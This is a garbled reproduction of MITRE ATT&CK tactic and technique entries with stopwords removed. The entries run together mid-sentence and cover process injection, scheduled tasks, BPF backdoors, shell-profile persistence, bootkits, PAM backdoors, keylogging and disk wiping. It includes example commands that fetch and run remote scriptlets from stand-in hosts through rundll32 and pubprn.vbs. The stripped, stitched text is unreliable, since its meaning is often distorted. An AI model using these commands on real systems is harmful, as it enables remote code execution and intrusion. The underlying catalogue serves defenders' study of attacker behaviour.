Below tactics techniques representing MITRE PRE-ATT&CK Matrix. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0015/).

Technical gathering consists process identifying critical technical elements intelligence adversary target attack.  Technical intelligence gathering includes, limited to, understanding target's network architecture, IP space, network services, email format, security procedures. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0013/).

Priority definition direction consists process collecting assigning requirements meeting Key Intelligence Topics (KIT) Key Intelligence Questions (KIQ) determined leadership. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0022/).

Establishing maintaining infrastructure consists building, purchasing, co-opting, maintaining systems services conduct cyber operations. adversary establish infrastructure communicate control assets operations. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0021/).

Adversary OPSEC consists technologies 3rd party services obfuscate, hide, blend accepted network traffic behavior.  adversary techniques evade defenses, reduce attribution, minimize discovery, increase time effort required analyze. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0014/).

Target selection consists iterative process adversary determines target strategic level narrowing operationally tactically specific target chosen.  target defined entity object performs function considered engagement action. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0018/).

Technical weakness identification consists identifying analyzing weaknesses vulnerabilities collected intelligence gathering phases determine approach based technical complexity adversary priorities expediency, stealthiness). object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0012/).

Priority definition planning consists process determining set Key Intelligence Topics (KIT) Key Intelligence Questions (KIQ) required meeting key strategic, operational, tactical goals.  Leadership outlines priority definition (may considered goal) adversary designs target selection plan achieve.  analyst outline priority definition determining gaps existing KITs KIQs. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0017/).

Organizational gathering consists process identifying critical organizational elements intelligence adversary target attack.  competitive intelligence, organizational intelligence gathering focuses understanding operational tempo organization gathering deep understanding organization operates, develop strategy target it. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0025/).

Testing capabilities takes adversaries capabilities externally refine development goals criteria ensure success operation. testing capability staged. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0020/).

Organizational weakness identification consists identifying analyzing weaknesses vulnerabilities intelligence gathering phases leveraged gain access target intermediate target organizations interest. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0023/).

Persona development consists development public information, presence, history affiliations.  development applied social media, website, publicly referenced scrutinized legitimacy operation persona identity. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0024/).

Building capabilities consists developing acquiring software, data techniques phases operation.  process identifying development requirements implementing solutions malware,  delivery mechanisms, obfuscation/cryptographic protections, O&M functions. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0026/).

Staging capabilities consists preparing operational environment required conduct operation.  includes activities deploying software, uploading data, enabling command control infrastructure. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0016/).

People Gathering consists process identifying critical personnel elements intelligence adversary target attack.  People intelligence gathering focuses identifying key personnel individuals critical accesses approach target attack.  involve aspects social engineering, elicitation, mining social media sources, understanding personnel element competitive intelligence. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/tactics/TA0019/).

People weakness identification consists identifying analyzing weaknesses vulnerabilities intelligence gathering phases leveraged gain access target intermediate target persons social trust relationships. Adversaries inject malicious code process Extra Window Memory (EWM) evade process-based defenses elevate privileges. EWM injection method executing arbitrary code address space separate live process. 

Before creating window, graphical Windows-based processes prescribe register windows class, stipulate appearance behavior (via windows procedures, functions handle input/output data).(Citation: Window Classes) Registration windows classes include request 40 bytes EWM appended allocated memory instance class. EWM intended store data specific window specific application programming interface (API) functions set value. (Citation: GetWindowLong function) (Citation: SetWindowLong function)

Although small, EWM store 32-bit pointer windows procedure. Malware utilize memory location attack chain includes writing code shared sections process’s memory, placing pointer code EWM, invoking execution returning execution control address process’s EWM.

Execution granted EWM injection access target process's memory elevated privileges. Writing payloads shared sections avoids highly monitored API calls <code>WriteProcessMemory</code> <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) sophisticated malware samples bypass protection mechanisms data execution prevention (DEP) triggering combination windows procedures functions rewrite malicious payload executable portion target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz Redyms Mar 2013)

Running code context process access process's memory, system/network resources, elevated privileges. Execution EWM injection evade detection security products execution masked legitimate process.  Adversaries abuse Windows Task Scheduler perform task scheduling initial recurring execution malicious code. multiple access Task Scheduler Windows. [schtasks](https://attack.mitre.org/software/S0111) utility command line, Task Scheduler GUI Administrator Tools Control Panel. cases, adversaries .NET wrapper Windows Task Scheduler, alternatively, adversaries Windows netapi32 library create scheduled task.

The deprecated [at](https://attack.mitre.org/software/S0110) utility abused adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), <code>at.exe</code> access tasks created <code>schtasks</code> Control Panel.

An adversary Windows Task Scheduler execute programs startup scheduled basis persistence. Windows Task Scheduler abused conduct remote Execution Lateral Movement process context account (such SYSTEM). [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries abused Windows Task Scheduler mask one-time execution signed/trusted processes.(Citation: ProofPoint Serpent)

Adversaries create "hidden" scheduled tasks [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) visible defender tools manual queries enumerate tasks. Specifically, adversary hide task `schtasks /query` Task Scheduler deleting Security Descriptor (SD) registry (where deletion completed permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries employ alternate methods hide tasks, altering metadata `Index` value) registry keys.(Citation: Defending Scheduled Task Attacks Windows Environments)  Adversaries attach filters network socket monitor activate backdoors persistence command control. elevated permissions, adversaries features `libpcap` library sockets install filters disallow types data socket. filter apply traffic passing network interface (or interface specified). network interface receives packet matching filter criteria, additional actions triggered host, activation reverse shell.

To establish connection, adversary sends crafted packet targeted host matches installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries socket filters trigger installation implants, conduct ping backs, invoke command shells. Communication socket filters conjunction [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin 2020)

Filters installed Unix-like platform `libpcap` installed Windows hosts `Winpcap`.  Adversaries `libpcap` `pcap_setfilter` standard library function `setsockopt` `SO_ATTACH_FILTER` options. socket connection active packet received, behavior difficult detect lack activity host, CPU overhead, limited visibility raw socket usage. malicious tool detected quarantined curtailed, adversary determine malicious tool detected (the indicator), modify tool removing indicator, updated version detected target's defensive systems subsequent targets systems.

A malware detected file signature quarantined anti-virus software. adversary determine malware quarantined file signature [Software Packing](https://attack.mitre.org/techniques/T1045) modify file signature, re-use malware. Adversaries utilities compress encrypt collected data prior exfiltration. utilities include functionalities compress, encrypt, package data format easier/more secure transport.

Adversaries abuse utilities compress encrypt data exfiltration. party utilities preinstalled, <code>tar</code> Linux macOS <code>zip</code> Windows systems. Windows, <code>diantz</code> <code> makecab</code> package collected files cabinet (.cab) file. <code>diantz</code> download compress files remote locations [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) Additionally, <code>xcopy</code> Windows files directories variety options.

Adversaries party utilities, 7-Zip, WinRAR, WinZip, perform activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage) Adversaries [Valid Accounts](https://attack.mitre.org/techniques/T1078) remotely control machines Virtual Network Computing (VNC).  VNC platform-independent desktop sharing RFB (“remote framebuffer”) protocol enable users remotely control computer’s display relaying screen, mouse, keyboard inputs network.(Citation: Remote Framebuffer Protocol)

VNC differs [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) VNC screen-sharing software resource-sharing software. default, VNC system's authentication, configured credentials specific VNC.(Citation: MacOS VNC software Remote Desktop)(Citation: VNC Authentication)

Adversaries abuse VNC perform malicious actions logged-on user documents, downloading files, running arbitrary commands. adversary VNC remotely control monitor collect data pivot systems network. Specific VNC libraries/implementations susceptible brute force attacks memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug) Adversaries abuse Windows Management Instrumentation (WMI) execute malicious commands payloads. WMI administration feature uniform environment access Windows components. WMI service enables local remote access, facilitated [Remote Services](https://attack.mitre.org/techniques/T1021) [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI DCOM operates port 135, WMI WinRM operates port 5985 5986 HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)

An adversary WMI interact local remote systems execute behaviors, gathering Discovery remote Execution files Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries establish persistence executing malicious commands triggered user’s shell. User shells execute configuration scripts session based events. example, user command interface remotely logs (such SSH) login initiated. login executes scripts (/etc) user’s directory (~/) configure environment. login shells <code>/etc/profile</code> initiated. configuration scripts permission level directory set environment variables, create aliases, customize user’s environment. exits terminates, additional scripts executed ensure exits appropriately. 

Adversaries attempt establish persistence inserting commands scripts automatically executed shells. bash example, default GNU/Linux systems, adversaries add commands launch malicious binaries <code>/etc/profile</code> <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). files require root permissions executed time launches. user level permissions, adversaries insert malicious commands <code>~/.bash_profile</code>, <code>~/.bash_login</code>, <code>~/.profile</code> (Rocke) sourced user command interface connects remotely. Adversaries ~/.bash_profile executes file exists listed order. Adversaries leveraged <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) additionally executed connection established remotely additional interactive opened, tab command interface. malware targets termination program trigger execution (Cannon), adversaries <code>~/.bash_logout</code> file execute malicious commands session(Pearl_shellbot). 

For macOS, functionality technique leverages zsh, default macOS 10.15+. Terminal.app opened, application launches zsh login zsh interactive shell. login configures environment <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, <code>/etc/zlogin</code>. login configures user environment <code>~/.zprofile</code> <code>~/.zlogin</code>. interactive <code>~/.zshrc<code> configure user environment. exiting, <code>/etc/zlogout</code> <code>~/.zlogout</code> executed. legacy programs, macOS executes <code>/etc/bashrc</code> startup. Adversaries attempt screen captures desktop gather operation. Screen capturing functionality included feature remote access tool post-compromise operations. screenshot typically native utilities API calls, <code>CopyFromScreen</code>, <code>xwd</code>, <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)
 bootkit malware variant modifies boot sectors hard drive, including Master Boot Record (MBR) Volume Boot Record (VBR). (Citation: MTrends 2016)

Adversaries bootkits persist systems layer operating system, difficult perform remediation organization suspects accordingly.

### Master Boot Record
The MBR disk loaded completing hardware initialization BIOS. location boot loader. adversary raw access boot drive overwrite area, diverting execution startup normal boot loader adversary code. (Citation: Lau 2011)

### Volume Boot Record
The MBR passes control boot process VBR. MBR, adversary raw access boot drive overwrite VBR divert execution startup adversary code. Adversaries scripts automatically executed boot logon initialization establish persistence. Initialization scripts perform administrative functions, execute programs send internal logging server. scripts vary based operating applied locally remotely.  

Adversaries scripts maintain persistence single system. Depending access configuration logon scripts, local credentials administrator account necessary. 

An adversary escalate privileges boot logon initialization scripts privileges. Adversaries attempt position networked devices adversary-in-the-middle (AiTM) technique support follow-on behaviors [Network Sniffing](https://attack.mitre.org/techniques/T1040) [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). abusing features common networking protocols determine flow network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries force device communicate adversary controlled collect perform additional actions.(Citation: Rapid7 MiTM Basics)

For example, adversaries manipulate victim DNS settings enable malicious activities preventing/redirecting users accessing legitimate sites pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries manipulate DNS leverage position intercept user credentials session cookies.(Citation: volexity_0day_sophos_FW) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s establish AiTM position, negotiating secure, deprecated, weaker version communication protocol (SSL/TLS) encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)

Adversaries leverage AiTM position attempt monitor modify traffic, [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries setup position AiTM prevent traffic flowing destination, [Impair Defenses](https://attack.mitre.org/techniques/T1562) support [Network Denial Service](https://attack.mitre.org/techniques/T1498). Adversaries attempt identify primary user, logged user, set users commonly system, user actively system. this, example, retrieving account usernames [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). collected Discovery techniques, user username details prevalent include running process ownership, file/directory ownership, session information, logs. Adversaries [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions.

Various utilities commands acquire information, including <code>whoami</code>. macOS Linux, logged user identified <code>w</code> <code>who</code>. macOS <code>dscl . list /Users | grep -v '_'</code> command enumerate user accounts. Environment variables, <code>%USERNAME%</code> <code>$USER</code>, access information. Adversaries buy, lease, rent infrastructure targeting. wide variety infrastructure exists hosting orchestrating adversary operations. Infrastructure solutions include physical cloud servers, domains, third-party services.(Citation: TrendmicroHideoutsLease) Additionally, botnets rent purchase.

Use infrastructure solutions adversary stage, launch, execute operation. Solutions adversary operations blend traffic normal, contact third-party services. Depending implementation, adversaries infrastructure difficult physically tie utilize infrastructure rapidly provisioned, modified, shut down. Adversaries abuse rundll32.exe proxy execution malicious code. rundll32.exe, vice executing [Shared Modules](https://attack.mitre.org/techniques/T1129)), avoid triggering security tools monitor execution rundll32.exe process allowlists false positives normal operations. Rundll32.exe commonly executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) undocumented shell32.dll functions <code>Control_RunDLL</code> <code>Control_RunDLLAsUser</code>. Double-clicking .cpl file rundll32.exe execute. (Citation: Trend Micro CPL)

Rundll32 execute scripts JavaScript. syntax this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  behavior malware Poweliks. (Citation: Security Command Confusion)

Adversaries attempt obscure malicious code analysis abusing manner rundll32.exe loads DLL function names. Windows compatibility support character sets, rundll32.exe check wide/Unicode ANSI character-supported functions loading function command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe attempt execute <code>ExampleFunctionW</code>, failing <code>ExampleFunctionA</code>, loading <code>ExampleFunction</code>). Adversaries obscure malicious code creating multiple identical exported function names appending <code>W</code> <code>A</code> harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions exported executed ordinal (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such changing DLL file names, file extensions, function names) conceal execution malicious payload.(Citation: rundll32.exe defense evasion)  Adversaries attempt discover containers resources containers environment. resources include images, deployments, pods, nodes, status cluster.

These resources viewed applications Kubernetes dashboard queried Docker Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) Docker, logs leak environment, environment’s configuration, services available, cloud provider victim utilizing. discovery resources inform adversary’s steps environment, perform lateral movement methods utilize execution.  Adversaries purchase configure serverless cloud infrastructure, Cloudflare Workers AWS Lambda functions, targeting. utilizing serverless infrastructure, adversaries difficult attribute infrastructure operations them.

Once acquired, serverless runtime environment leveraged respond infected machines [Proxy](https://attack.mitre.org/techniques/T1090) traffic adversary-owned command control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) traffic generated functions subdomains common cloud providers, difficult distinguish ordinary traffic providers.(Citation: Detecting Command & Control Cloud)(Citation: BlackWater Malware Cloudflare Workers) Adversaries implement hidden windows conceal malicious activity plain sight users. cases, windows typically displayed application carries operation hidden. utilized administrators avoid disrupting user environments carrying administrative tasks. Adversaries abuse operating functionality hide visible windows users alert user adversary activity system.

### Windows
There variety features scripting languages Windows, [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, VBScript windows hidden. <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell 2019)

### Mac
The configurations applications macOS listed property list (plist) files. tags files be <code>apple.awt.UIElement</code>, Java applications prevent application's icon appearing Dock. common applications tray, Dock. However, adversaries abuse feature hide running window.(Citation: Antiquated Mac Malware)
 Mach-O binaries series headers perform operations binary loaded. LC_LOAD_DYLIB header Mach-O binary tells macOS OS dynamic libraries (dylibs) load execution time. ad-hoc compiled binary adjustments rest fields dependencies (Citation: Writing Bad Malware OSX). tools perform changes. invalidate digital signatures binaries binary modified. Adversaries remediate issue simply removing LC_CODE_SIGNATURE command binary signature isn’t checked load time (Citation: Malware Persistence OS X). Adversaries encode data standard data encoding content command control traffic difficult detect. Command control (C2) encoded standard data encoding adheres existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) data encoding systems result data compression, gzip. Adversaries embed payloads files conceal malicious content defenses. seemingly benign files (such scripts executables) abused carry obfuscate malicious payloads content. cases, embedded payloads enable adversaries [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) impacting execution controls digital signatures notarization tickets.(Citation: Sentinel Labs) 

Adversaries embed payloads file formats hide payloads.(Citation: Learn) [Steganography](https://attack.mitre.org/techniques/T1027/003), involve weaving malicious content specific bytes patterns legitimate digital media formats.(Citation: GitHub PSImage) 

For example, adversaries observed embedding payloads overlay benign binary.(Citation: Securelist Dtrack2) Adversaries observed nesting payloads (such executables run-only scripts) file format.(Citation: SentinelLabs reversing run-only applescripts 2021) 

Embedded content [Process Injection](https://attack.mitre.org/techniques/T1055) payloads infect benign processes.(Citation: Trend Micro) embedded injected payloads modules malware designed provide specific features encrypting C2 communications support orchestrator module. example, embedded module injected default browsers, allowing adversaries communicate network.(Citation: Malware Analysis Report ComRAT) Property list (plist) files macOS OS configure applications services. files UTF-8 encoded formatted XML documents series surrounded < >. programs execute, file paths executables, program arguments, required OS permissions, others. plists located locations depending purpose <code>/Library/Preferences</code> (which execute elevated privileges) <code>~/Library/Preferences</code> (which execute user's privileges). 
Adversaries modify plist files code, execute code context user, bypass whitelisting procedures, persistence mechanism. (Citation: Sofacy Komplex Trojan) Adversaries modify pluggable authentication modules (PAM) access user credentials enable unwarranted access accounts. PAM modular configuration files, libraries, executable files guide authentication services. common authentication module <code>pam_unix.so</code>, retrieves, sets, verifies account authentication <code>/etc/passwd</code> <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Pam_Unix)(Citation: Red Hat PAM)

Adversaries modify components PAM create backdoors. PAM components, <code>pam_unix.so</code>, patched accept arbitrary adversary supplied values legitimate credentials.(Citation: PAM Backdoor)

Malicious modifications PAM abused steal credentials. Adversaries infect PAM resources code harvest user credentials, values exchanged PAM components plain-text PAM store passwords.(Citation: PAM Creds)(Citation: Apple PAM) adversary revert cloud instance performed malicious activities attempt evade detection remove evidence presence. highly virtualized environments, cloud-based infrastructure, accomplished restoring virtual machine (VM) data storage snapshots cloud management dashboard cloud APIs.

Another variation technique utilize temporary storage attached compute instance. cloud providers provide types storage including persistent, local, ephemeral, ephemeral types reset stop/restart VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot) <code>HISTCONTROL</code> environment variable track saved <code>history</code> command eventually <code>~/.bash_history</code> file user logs out. setting configured ignore commands start space simply setting "ignorespace". <code>HISTCONTROL</code> set ignore duplicate commands setting "ignoredups". Linux systems, set default "ignoreboth" covers previous examples. “ ls” saved, “ls” saved history. <code>HISTCONTROL</code> exist default macOS, set user respected. Adversaries operate leaving traces simply prepending space terminal commands. Adversaries gather victim's hosts targeting. hosts include variety details, including administrative data (ex: name, assigned IP, functionality, etc.) specifics configuration (ex: operating system, language, etc.).

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) [Phishing Information](https://attack.mitre.org/techniques/T1598). Adversaries compromise sites include malicious content designed collect host visitors.(Citation: ATT ScanBox) hosts exposed adversaries online accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) [External Remote Services](https://attack.mitre.org/techniques/T1133)). Adversaries search public digital certificate data victims targeting. Digital certificates issued certificate authority (CA) cryptographically verify origin signed content. certificates, encrypted traffic (HTTPS SSL/TLS communications), registered organization location.

Adversaries search digital certificate data gather actionable information. Threat actors online resources lookup tools harvest certificates.(Citation: SSLShopper Lookup) Digital certificate data artifacts signed organization (ex: certificates encrypted traffic served content).(Citation: Medium SSL Cert) sources reveal opportunities forms reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) [Phishing Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). Adversaries log user keystrokes intercept credentials user types them. Keylogging acquire credentials access opportunities [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts effective, require adversary intercept keystrokes substantial period time credentials captured.

Keylogging prevalent type input capture, intercepting keystrokes.(Citation: Adventures Keystroke) methods include:

* Hooking API callbacks processing keystrokes. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), focuses solely API functions intended processing keystroke data.
* Reading raw keystroke data hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* [Modify Image](https://attack.mitre.org/techniques/T1601) provide adversaries hooks operating network devices read raw keystrokes login sessions.(Citation: Cisco Blog Legacy Device Attacks)  Adversaries modify file directory permissions/attributes evade access control lists (ACLs) access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 2018) File directory permissions commonly managed ACLs configured file directory owner, users permissions. File directory ACL implementations vary platform, explicitly designate users perform actions (read, write, execute, etc.).

Most Linux Linux-based platforms provide standard set permission (user, group, other) standard set permissions (read, write, execute) applied group. nuances platform’s permissions implementation vary, platforms provide primary commands manipulate file directory ACLs: <code>chown</code> (short change owner), <code>chmod</code> (short change mode).

Adversarial commands owner files directories change mode current permissions it. subsequently lock file. Specific file directory modifications required step techniques, establishing Persistence [Unix Configuration Modification](https://attack.mitre.org/techniques/T1546/004) tainting/hijacking instrumental binary/configuration files [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools Techniques)  Adversaries prior knowledge legitimate credentials environment guess passwords attempt access accounts. knowledge password account, adversary opt systematically guess password repetitive iterative mechanism. adversary guess login credentials prior knowledge environment passwords operation list common passwords. Password guessing account target's policies password complexity policies lock accounts failed attempts.

Guessing passwords risky option numerous authentication failures account lockouts, depending organization's login failure policies. (Citation: Cylance Cleaver)

Typically, management services commonly ports guessing passwords. Commonly targeted services include following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)
* SNMP (161/UDP 162/TCP/UDP)

In addition management services, adversaries "target single sign-on (SSO) cloud-based applications utilizing federated authentication protocols," externally facing email applications, Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries abuse network device interfaces (such `wlanAPI`) brute force accessible wifi-router(s) wireless authentication protocols.(Citation: Trend Micro Emotet 2020)

In default environments, LDAP Kerberos connection attempts trigger events SMB, creates Windows "logon failure" event 4625. Adversaries PubPrn proxy execution malicious remote files. PubPrn.vbs [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script publishes printer Active Directory Domain Services. script signed commonly executed [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) <code>Cscript.exe</code>. example, code publishes printer domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries abuse PubPrn execute malicious payloads hosted remote sites.(Citation: Enigma0x3 PubPrn Bypass) so, adversaries set <code>script:</code> parameter reference scriptlet file (.sct) hosted remote site. command <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. behavior bypass signature validation restrictions application control solutions account abuse script.

In versions Windows (10+), <code>PubPrn.vbs</code> updated prevent proxying execution remote site. limiting protocol parameter <code>LDAP://</code>, vice <code>script:</code> moniker reference remote code HTTP(S). Adversaries purchase technical victims targeting. victims purchase reputable private sources databases, paid subscriptions feeds scan databases data aggregation services. Adversaries purchase less-reputable sources dark cybercrime blackmarkets.

Adversaries purchase identified targets, purchased data discover opportunities successful breaches. Threat actors gather technical details purchased data, including limited employee contact information, credentials, specifics victim’s infrastructure.(Citation: ZDNET Selling Data) sources reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Valid Accounts](https://attack.mitre.org/techniques/T1078)). Adversaries attempt dump credentials account login credential material, form hash password, operating software. Credentials perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) access restricted information.

Several tools mentioned sub-techniques adversaries professional security testers. Additional custom tools exist well.
 Adversaries execute malicious payloads loading shared modules. Windows module loader instructed load DLLs arbitrary local paths arbitrary Universal Naming Convention (UNC) network paths. functionality resides NTDLL.dll Windows [Native API](https://attack.mitre.org/techniques/T1106) called functions <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. Win32 API.(Citation: Wikipedia Windows Library Files)

The module loader load DLLs:

* specification (fully-qualified relative) DLL pathname IMPORT directory;
    
* EXPORT forwarded DLL, (fully-qualified relative) pathname (but extension);
    
* NTFS junction symlink program.exe.local fully-qualified relative pathname directory DLLs IMPORT directory forwarded EXPORTs;
    
* <code>&#x3c;file name="filename.extension" loadFrom="fully-qualified relative pathname"&#x3e;</code> embedded external "application manifest". file refers entry IMPORT directory forwarded EXPORT.

Adversaries functionality execute arbitrary payloads victim system. example, malware execute share modules load additional components features. Adversaries collect data managed devices configuration repositories. Configuration repositories management systems configure, manage, control data remote systems. Configuration repositories facilitate remote access administration devices.

Adversaries target repositories collect quantities sensitive administration data. Data configuration repositories exposed protocols software store wide variety data, align adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017) Adversaries corrupt wipe disk data structures hard drive boot system; targeting specific critical systems network interrupt availability network resources. 

Adversaries attempt render unable boot overwriting critical data located structures master boot record (MBR) partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) data contained disk structures include initial executable code loading operating location file partitions disk. present, load operating boot process, leaving unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) performed isolation, [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) sectors disk wiped.

